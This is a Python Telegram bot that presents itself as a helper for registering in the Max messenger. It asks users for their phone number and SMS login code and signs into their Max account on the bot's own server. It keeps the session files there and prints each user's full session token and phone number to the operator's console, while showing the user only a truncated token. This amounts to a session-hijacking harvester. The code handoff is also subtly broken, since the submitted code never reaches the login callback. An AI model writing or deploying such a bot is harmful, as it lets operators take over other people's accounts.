import asyncio
import os
import traceback
from typing import Dict

from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from dotenv import load_dotenv

from pymax import SocketMaxClient
from pymax.payloads import UserAgentPayload

# ========== ЗАГРУЗКА ПЕРЕМЕННЫХ ==========
load_dotenv()
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")

if not TELEGRAM_TOKEN:
    raise ValueError("TELEGRAM_TOKEN не найден в .env файле")

# ========== ИНИЦИАЛИЗАЦИЯ БОТА ==========
bot = Bot(token=TELEGRAM_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

# ========== СОСТОЯНИЯ ==========
class RegStates(StatesGroup):
    waiting_phone = State()
    waiting_code = State()

# ========== ВРЕМЕННОЕ ХРАНИЛИЩЕ ==========
temp_sessions: Dict[int, dict] = {}

# ========== КОМАНДА /START ==========
@dp.message(Command("start"))
async def cmd_start(message: types.Message, state: FSMContext):
    await message.answer(
        "👋 Привет! Я помогу зарегистрироваться в Max.\n\n"
        "Введите ваш номер телефона в формате:\n"
        "`+79123456789`",
        parse_mode="Markdown"
    )
    await state.set_state(RegStates.waiting_phone)

# ========== ОБРАБОТКА НОМЕРА ==========
@dp.message(RegStates.waiting_phone)
async def process_phone(message: types.Message, state: FSMContext):
    phone = message.text.strip()
    user_id = message.from_user.id
    
    if not phone.startswith("+") or not phone[1:].isdigit():
        await message.answer("❌ Неверный формат. Пример: `+79123456789`", parse_mode="Markdown")
        return
    
    await message.answer(f"📱 Отправляю запрос на номер {phone}...")
    
    try:
        # Создаём клиент для входа по номеру телефона
        ua = UserAgentPayload(device_type="DESKTOP", app_version="25.12.13")
        client = SocketMaxClient(
            phone=phone,
            work_dir=f"cache_{user_id}",
            headers=ua
        )
        
        # Создаём событие для ожидания кода
        code_received = asyncio.Event()
        user_code = None
        
        # Подписываемся на запрос кода
        @client.on_code_request
        async def on_code_request():
            nonlocal user_code
            # Уведомляем пользователя через Telegram
            await message.answer("📲 Код отправлен! Введите код из SMS:")
            # Переводим состояние бота в ожидание кода
            await state.set_state(RegStates.waiting_code)
            # Ждём, пока пользователь введёт код
            await code_received.wait()
            # Возвращаем код библиотеке
            return user_code
        
        # Сохраняем данные сессии
        temp_sessions[user_id] = {
            "client": client,
            "phone": phone,
            "code_received": code_received,
            "user_code": user_code
        }
        
        # Запускаем клиент в фоне (он сам начнёт процесс авторизации)
        asyncio.create_task(client.start())
        
    except Exception as e:
        print(f"[ERROR] {type(e).__name__}: {e}")
        traceback.print_exc()
        await message.answer(f"❌ Ошибка: {e}\nПопробуйте /start")

# ========== ОБРАБОТКА КОДА ==========
@dp.message(RegStates.waiting_code)
async def process_code(message: types.Message, state: FSMContext):
    code = message.text.strip()
    user_id = message.from_user.id
    
    # Проверяем сессию
    if user_id not in temp_sessions:
        await message.answer("❌ Сессия истекла. Начните заново с /start")
        await state.clear()
        return
    
    session = temp_sessions[user_id]
    client = session["client"]
    phone = session["phone"]
    code_received = session["code_received"]
    
    # Передаём код в обработчик
    session["user_code"] = code
    code_received.set()
    
    await message.answer("🔐 Подтверждаю код...")
    
    try:
        # Даём время на завершение авторизации
        await asyncio.sleep(5)
        
        # Проверяем, авторизован ли клиент
        if client.is_authorized:
            token = client.me.token
            await message.answer(
                f"✅ **Регистрация в Max успешна!**\n\n"
                f"📱 Номер: `{phone}`\n"
                f"🔑 Токен: `{token[:30]}...`\n\n"
                f"⚠️ Сохраните токен для будущих входов.",
                parse_mode="Markdown"
            )
            print(f"\n{'='*50}")
            print(f"✅ НОВЫЙ ПОЛЬЗОВАТЕЛЬ")
            print(f"📱 Номер: {phone}")
            print(f"🔑 Токен: {token}")
            print(f"{'='*50}\n")
        else:
            await message.answer("❌ Не удалось авторизоваться. Проверьте код и попробуйте снова /start")
        
        # Очищаем сессию
        del temp_sessions[user_id]
        await state.clear()
        
    except Exception as e:
        print(f"[ERROR] {type(e).__name__}: {e}")
        traceback.print_exc()
        await message.answer(f"❌ Ошибка: {e}\nПопробуйте /start")

# ========== ЗАПУСК ==========
async def main():
    print("=" * 50)
    print("🚀 Бот запущен")
    print("=" * 50)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
